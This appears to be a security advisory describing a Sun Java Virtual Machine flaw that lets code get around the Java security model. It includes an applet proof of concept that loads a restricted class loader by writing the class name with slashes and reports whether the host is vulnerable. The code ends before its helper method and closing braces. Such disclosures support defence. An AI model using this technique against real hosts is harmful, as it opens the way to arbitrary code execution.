source: http://www.securityfocus.com/bid/8879/info

A vulnerability has been identified in the Sun Java Virtual Machine packaged with JRE and SDK. This issue results in the circumvention of the Java Security Model, and can permit an attacker to execute arbitrary code on vulnerable hosts. 

import java.applet.Applet;
import java.awt.Graphics;
import java.lang.Class;
import java.security.AccessControlException;

public class Simple extends Applet {

StringBuffer buffer;

public void init() {
buffer = new StringBuffer();
}

public void start() {
ClassLoader cl = this.getClass().getClassLoader();
try {
Class cla =
cl.loadClass("sun/applet/AppletClassLoader"); // Note the slashes
addItem("No exception in loadClass. Vulnerable!");
} catch (ClassNotFoundException e) {
addItem("ClassNotFoundException in loadClass - " + e);
} catch (AccessControlException e) {
addItem("AccessControlException in loadClass - Not
Vulnerable!");
}

}